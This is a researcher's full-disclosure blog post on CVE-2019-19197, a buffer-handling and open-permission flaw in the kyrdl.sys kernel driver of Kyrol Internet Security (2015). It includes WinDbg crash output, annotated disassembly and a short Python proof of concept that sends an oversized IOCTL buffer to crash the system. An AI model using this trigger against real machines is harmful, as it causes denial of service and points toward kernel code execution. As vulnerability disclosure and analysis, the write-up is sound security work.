---
layout: post
title:  "CVE-2019-19197 - (0-Day) Kyrol Internet Security (2015) - Multiple Vulnerability in Kernel Driver"
date:   2019-11-16 13:39:03 +0800
tags:
    - CVE-2019-19197
---

Description
-----------
Kyrol Internet Security (2015) is an Antivirus product made in Malaysia. The product basically cover most of the basic Antivirus features including a scanning engine, database update and few more other stuff. This round, I'm going for a full disclosure as the timeline of the disclosure has been exceeded since early January 2019. Total numbers of vulnerability found in the product consists 12 different issues covers various types of attack surface. In this writeup, I will go with the most trivial vulnerability to spot which is the IOCTL handling and ACL Privileges of the driver. 

Technical Analysis
------------------
A vulnerability in kyrdl.sys driver has been discovered in Kyrol Internet Security (2015).
The vulnerability exists due to insufficient input buffer validation when the driver processes IOCTL codes 0x9C402401 using METHOD_NEITHER and due to insecure permissions allowing everyone read and write access to privileged use only functionality. Attackers can exploit this issue to execute arbitrary code in kernel space or cause Denial of Service (DoS).

We can use WinObj by Sysinternals to verify the object device are indeed accessible by user-mode. In the "GLOBAL??", we can scroll until we see "10774948FAA234777974ED537F346B29F" which is work as SymbolicLink to device "1036EC9A3100C4296A350F32080965C40". As we analyzed before, it creates a symbolic link to "10774948FAA234777974ED537F346B29F". Verifying the security access, we can see the permission for "1036EC9A3100C4296A350F32080965C40" is open to Everyone with capability to Read and Write, which means any user can send / trigger IOCTL directly to the kernel driver. We will see the DACL object in debugger later. Continue sending to IOCTL via user-mode to the kernel to trigger BSOD. The first issue as shown below. Successful sending the IOCTL resulting this on our debugger (WinDBG):
```
Error from BSOD
*** Fatal System Error: 0x0000003b
                       (0x00000000C0000005,0xFFFFF880018A51F6,0xFFFFF88005D91DB0,0x0000000000000000)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.
...  cut here ... 
FAULTING_IP: 
kyrdl+31f6
fffff880`018a51f6 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]

Registers
CONTEXT:  fffff88005d91db0 -- (.cxr 0xfffff88005d91db0)
rax=fffffa80042857c0 rbx=0000000000000002 rcx=0000000000000800
rdx=0000000000000000 rsi=fffffa806155bfcc rdi=0000000000000000
rip=fffff880018a51f6 rsp=fffff88005d92780 rbp=0000000000000001
 r8=0000000000000000  r9=0000000000000001 r10=0000000000000001
r11=fffff88005d925b0 r12=fffffa80048a3aa0 r13=0000000000000000
r14=fffffa80048b2788 r15=0000000000000001
iopl=0         nv up ei pl nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
kyrdl+0x31f6:
fffff880`018a51f6 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]

Vulnerable Part 
kd> u kyrdl+0x31f6
kyrdl+0x31f6:
fffff880`018a51f6 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]   ; memcpy function
fffff880`018a51f8 488b542438      mov     rdx,qword ptr [rsp+38h]
fffff880`018a51fd 4881c200080000  add     rdx,800h
fffff880`018a5204 488d0d95310000  lea     rcx,[kyrdl+0x63a0 (fffff880`018a83a0)]
fffff880`018a520b e840deffff      call    kyrdl+0x1050 (fffff880`018a3050)
fffff880`018a5210 eb95            jmp     kyrdl+0x31a7 (fffff880`018a51a7)
fffff880`018a5212 e8f9000000      call    kyrdl+0x3310 (fffff880`018a5310)
fffff880`018a5217 4883c448        add     rsp,48h

Proving we can write something on kernel space. This allow attacker write a shellcode to perform code execution.
kd> dd fffffa80042857c0
fffffa80`042857c0  41414141 41414141 41414141 41414141
fffffa80`042857d0  41414141 41414141 41414141 41414141
fffffa80`042857e0  41414141 41414141 41414141 41414141
fffffa80`042857f0  41414141 41414141 41414141 41414141
fffffa80`04285800  41414141 41414141 41414141 41414141
fffffa80`04285810  41414141 41414141 41414141 41414141
fffffa80`04285820  41414141 41414141 41414141 41414141
fffffa80`04285830  41414141 41414141 41414141 41414141
```

Second issue, the Security Descriptor showing the access open to “Everyone”:
```
kd> !sd fffff8a000087930 0x1
->Revision: 0x1
->Sbz1    : 0x0
->Control : 0x8814
            SE_DACL_PRESENT
            SE_SACL_PRESENT
            SE_SACL_AUTO_INHERITED
            SE_SELF_RELATIVE
->Owner   : S-1-5-32-544 (Alias: BUILTIN\Administrators)
->Group   : S-1-5-18 (Well Known Group: NT AUTHORITY\SYSTEM)
->Dacl    : 
->Dacl    : ->AclRevision: 0x2
->Dacl    : ->Sbz1       : 0x0
->Dacl    : ->AclSize    : 0x5c
->Dacl    : ->AceCount   : 0x4
->Dacl    : ->Sbz2       : 0x0
->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
->Dacl    : ->Ace[0]: ->AceFlags: 0x0
->Dacl    : ->Ace[0]: ->AceSize: 0x14
->Dacl    : ->Ace[0]: ->Mask : 0x001201bf
->Dacl    : ->Ace[0]: ->SID: S-1-1-0 (Well Known Group: localhost\Everyone)
```

Vulnerability Analysis
----------------------
DriverEntry starts at 0x19478 and ends at 0x19491. It first perform some bug checking at "sub_1941C". This section contains descriptions of the common bug checks, including the parameters passed to the blue screen. It also describes how you can diagnose the fault which led to the bug check, and possible ways to deal with the error. If it pass, it will continue the execution until address 0x19491 which is a ump instruction to function "sub_19010".
```
INIT:0000000000019478                 sub     rsp, 28h
INIT:000000000001947C                 mov     r8, rdx
INIT:000000000001947F                 mov     r9, rcx
INIT:0000000000019482                 call    sub_1941C	  ; call to perform bug checking, etc.
INIT:0000000000019487                 mov     rdx, r8	  ; continue executing here after pass bug checking
INIT:000000000001948A                 mov     rcx, r9
INIT:000000000001948D                 add     rsp, 28h
INIT:0000000000019491                 jmp     sub_19010	  ; jump to sub_19010
INIT:0000000000019491 DriverEntry     endp	
```

We continue analyzing at the "sub_19010". The address for the function start from 0x19010 and ends at 0x19470. Starting at the address 0x19023 until 0x19044, the driver perform an initializes of a resource variable. According to MSDN, "You can use the ERESOURCE structures to implement read/writer locking in your driver. The system provides a set of routines to manipulate the ERESOURCE structures, which are documented in this section."
```
INIT:0000000000019023                 lea     rcx, Resource   			; Resource
INIT:000000000001902A                 call    cs:ExInitializeResourceLite
INIT:0000000000019030                 lea     rcx, stru_162D0 			; Resource
INIT:0000000000019037                 call    cs:ExInitializeResourceLite
INIT:000000000001903D                 lea     rcx, stru_16338 			; Resource
INIT:0000000000019044                 call    cs:ExInitializeResourceLite
```

At the address 0x1904A until 0x1908E, it call IoCreateDevice and creates a device object for use by a driver. It is initialized through the RtlInitUnicodeString API. "Device" string is a device name in the object manager. After successfully creating the object, it proceeds to DRIVER_OBJECT processing.
```
INIT:000000000001904A                 lea     rdx, SourceString ; "\\Device\\1036EC9A3100C4296A350F3208096"...
INIT:0000000000019051                 lea     rcx, DeviceName ; DestinationString
INIT:0000000000019058                 call    cs:RtlInitUnicodeString
INIT:000000000001905E                 lea     rdx, DeviceObject
INIT:0000000000019065                 mov     [rsp+30h], rdx  ; DeviceObject
INIT:000000000001906A                 mov     byte ptr [rsp+28h], 0 ; Exclusive
INIT:000000000001906F                 mov     dword ptr [rsp+20h], 100h ; DeviceCharacteristics
INIT:0000000000019077                 mov     r9d, 22h        ; DeviceType
INIT:000000000001907D                 lea     r8, DeviceName  ; DeviceName
INIT:0000000000019084                 xor     edx, edx        ; DeviceExtensionSize
INIT:0000000000019086                 mov     rcx, [rsp+0D0h] ; DriverObject
INIT:000000000001908E                 call    cs:IoCreateDevice
```

Analysis of our IRP dispatch routine with its major functions (below). At this point we know that the handler can perform device control of IRP (0x70), close (0x80) and query security information value (0xE).
```
INIT:00000000000190CF                 mov     rcx, [rsp+0D0h]
INIT:00000000000190D7                 lea     rax, sub_18660	; "sub_18660" act as IRP handler
INIT:00000000000190DE                 mov     [rcx+70h], rax	; 0x70 = IRP_MJ_DEVICE_CONTROL 
INIT:00000000000190E2                 mov     rcx, [rsp+0D0h]
INIT:00000000000190EA                 lea     rax, sub_18660	; "sub_18660" act as IRP handler
INIT:00000000000190F1                 mov     [rcx+80h], rax	; 0x80 = IRP_MJ_CLOSE
INIT:00000000000190F8                 mov     rcx, [rsp+0D0h]
INIT:0000000000019100                 lea     rax, sub_186E0	; "sub_186E0" act as IRP handler
INIT:0000000000019107                 mov     [rcx+0E0h], rax	; 0xE = IRP_MJ_QUERY_SECURITY
```

Then it proceed creating another device at address 0x1910E and use the value from address 0x191AC. 
```
INIT:000000000001910E                 lea     rax, aDosdevices  ; "\\DosDevices\\"
INIT:0000000000019115                 mov     [rsp+0C8h+anonymous_1], rax
INIT:000000000001911D                 lea     rax, word_16130  ; space for the device string created
INIT:0000000000019124                 mov     [rsp+0C8h+anonymous_2], rax
INIT:000000000001912C                 mov     rax, [rsp+0C8h+anonymous_2]
INIT:0000000000019134                 mov     [rsp+0C8h+anonymous_3], rax
... cut here ...
INIT:00000000000191AC                 lea     rsi, a10774948faa234 ; "10774948FAA234777974ED537F346B29F"
INIT:00000000000191B3                 mov     ecx, 44h
INIT:00000000000191B8                 rep movsb
```

Successfully creating, it then call the device string created to initialized and create a symbolic link to the device object. 
```
INIT:00000000000191BA                 lea     rdx, word_16130 ; SourceString
INIT:00000000000191C1                 lea     rcx, SymbolicLinkName ; DestinationString
INIT:00000000000191C8                 call    cs:RtlInitUnicodeString
INIT:00000000000191CE                 lea     rdx, DeviceName ; DeviceName
INIT:00000000000191D5                 lea     rcx, SymbolicLinkName ; SymbolicLinkName
INIT:00000000000191DC                 call    cs:IoCreateSymbolicLink
```

Most of the IRP parametres are in the IO_STACK_LOCATION. A driver accesses its IO_STACK_LOCATION using IoGetCurrentIrpStackLocation routine. This part can be treat as input parameter. Current stack location as in following code:
```
PAGE:0000000000018747                 mov     [rsp+38h], rax 
PAGE:000000000001874C                 mov     rax, [rsp+38h]		
PAGE:0000000000018751                 mov     eax, [rax+10h]
PAGE:0000000000018754                 mov     [rsp+30h], eax
PAGE:0000000000018758                 mov     rax, [rsp+38h]
PAGE:000000000001875D                 mov     eax, [rax+8]
PAGE:0000000000018760                 mov     [rsp+50h], eax		
PAGE:0000000000018764                 mov     rax, [rsp+38h]					
PAGE:0000000000018769                 mov     eax, [rax+18h]  ; get the value IOCTL send and store it in EAX
PAGE:000000000001876C                 mov     [rsp+54h], eax  ; store IOCTL value in [rsp+54h]
PAGE:0000000000018770                 cmp     dword ptr [rsp+54h], 9C402401h	; IOCTL value - 0x9C402401 and compare value 
PAGE:0000000000018778                 jz      short loc_18786  ; assume that we can send the IOCTL 0x9C402401 and pass, it will jump to "loc_18786".
```

Triggering the IOCTL 0x9C402401 required another parameter in order for it to successfully trigger. 
```
PAGE:0000000000018786        cmp     dword ptr [rsp+30h], 0	; failure to give any input will  
PAGE:000000000001878B        jz      short loc_187B2		; terminate here
PAGE:000000000001878D        mov     rax, [rsp+78h]		; input store in RAX
PAGE:0000000000018792        mov     rax, [rax+18h]
PAGE:0000000000018796        mov     [rsp+20h], rax		; move the input to [rsp+20h]
PAGE:000000000001879B        mov     rcx, [rsp+20h]		; final store at RCX
PAGE:00000000000187A0        call    sub_13150	; accept input from here, and reference to another place "sub_13150"
```

We examine the part "sub_13150" to see what gets executed here. At the address 0x13150, we can see the final value that hold in RCX is based on our input (arg_0). Highlighted below are the root cause of the vulnerability.
```
.text:0000000000013150                 mov     [rsp+arg_0], rcx		; hold the input
.text:0000000000013155                 push    rsi
.text:0000000000013156                 push    rdi
.text:0000000000013157                 sub     rsp, 48h
.text:000000000001315B                 mov     rax, [rsp+58h+arg_0]	; store the input at RAX
.text:0000000000013160                 mov     [rsp+58h+var_38], rax	; save pointer to var_38
.text:0000000000013165                 mov     rax, [rsp+58h+var_38]
.text:000000000001316A                 mov     ecx, [rax]
.text:000000000001316C                 lea     rax, dword_163B8
.text:0000000000013173                 xchg    ecx, [rax]
.text:0000000000013175                 mov     rax, [rsp+58h+var_38]
.text:000000000001317A                 mov     ecx, [rax+4]
.text:000000000001317D                 lea     rax, dword_163BC
.text:0000000000013184                 xchg    ecx, [rax]
.text:0000000000013186                 mov     edx, 1
.text:000000000001318B                 lea     rcx, qword_163A0
.text:0000000000013192                 call    sub_11120		; assume that our call pass here
.text:0000000000013197                 call    sub_132F0		; assume that our call pass here
.text:000000000001319C                 mov     [rsp+58h+var_30], 0
.text:00000000000131A5                 jmp     short loc_131B5	; and we pass this too
... cut here ...
.text:00000000000131B5                 mov     rax, [rsp+58h+var_38]	; pointer to our input
.text:00000000000131BA                 mov     eax, [rax+8]
.text:00000000000131BD                 cmp     [rsp+58h+var_30], rax
.text:00000000000131C2                 jnb     short loc_13212
.text:00000000000131C4                 mov     edx, 808h     ; NumberOfBytes assigned which is 0x808
.text:00000000000131C9                 xor     ecx, ecx      ; PoolType
.text:00000000000131CB                 call    cs:ExAllocatePool	; allocates pool memory of the specified type and returns a pointer to the allocated block
.text:00000000000131D1                 mov     [rsp+58h+var_20], rax
.text:00000000000131D6                 mov     rcx, [rsp+58h+var_30]
.text:00000000000131DB                 imul    rcx, 800h					
.text:00000000000131E2                 mov     rax, [rsp+58h+var_38] ; the input will be store at rax
.text:00000000000131E7                 mov     rdi, [rsp+58h+var_20]
.text:00000000000131EC                 lea     rsi, [rax+rcx+0Ch]	    ; load the value of our input
.text:00000000000131F1                 mov     ecx, 800h	; size of the assigned value is 0x800
.text:00000000000131F6                 rep movsb		; memcpy function
.text:00000000000131F8                 mov     rdx, [rsp+58h+var_20]; if input is greater than 0x800, we can overflow and overwrite something
.text:00000000000131FD                 add     rdx, 800h
.text:0000000000013204                 lea     rcx, qword_163A0
.text:000000000001320B                 call    sub_11050
.text:0000000000013210                 jmp     short loc_131A7
```

Proof-of-Concept
----------------
Few lines of Python should sufficient enough to trigger the vulnerability. The bug itself is a read primitive so I will leave the rest to you to figure out.
```
import ctypes, sys
from ctypes import *
 
kernel32 = windll.kernel32
hDevice = kernel32.CreateFileA("\\\\.\\10774948FAA234777974ED537F346B29F", 0xC0000000, 0, None, 0x3, 0, None)
buffer = "A"*2048
buffer_length = len(buffer)
kernel32.DeviceIoControl(hDevice, 0x9C402401, buffer, buffer_length, None, 0, byref(c_ulong()), None)
```

**Disclosure timeline**
```
2019-01-02 - Reported to Kyrol Labs (via email)
2019-01-04 - Vendor ack but they seems to be confuse what is happening.
2019-04-18 - Ask for update, they said give another 2 weeks.
2019-04-18 - NACSA steps in (Thanks Abu!). Video conferencing with the NACSA (twice!).
2019-07-03 - Second meeting with NACSA and vendor. Vendor told us they will come up with new product by October 2019.
2019-09-01 - Third meeting with NACSA and vendor (before we presenting at POC in Korea). Kyrol couldn't release the new product at that time. Considering it as 0-day!
2019-11-07 - We present our findings in POC conference in Korea.
2019-11-16 - Full disclosure. Will look forward to request CVE's for this :)
```

Happy Hacking!
